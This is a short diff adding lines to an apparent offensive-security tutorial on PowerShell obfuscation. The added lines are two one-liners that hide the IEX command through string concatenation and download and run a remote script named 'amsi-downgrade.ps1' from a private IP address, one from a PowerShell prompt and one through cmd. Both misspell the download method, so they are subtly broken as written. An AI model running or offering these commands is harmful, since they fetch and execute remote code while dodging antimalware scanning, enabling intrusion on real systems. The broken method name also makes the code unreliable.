@@ -1105,6 +1105,12 @@ Here we can view the all process of encoding/decoding in powershell console
 
 ![var declaration success](http://i65.tinypic.com/2hx85g3.jpg)
 
+      [another way]
+      ## Obfuscating IEX (In PS Prompt)
+      & ('i'+'ex') (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
+      ## Obfuscating IEX (In CMD Prompt)
+      cmd /c powershell "& ('i'+'ex')" (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
+
 ---
 
 [0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
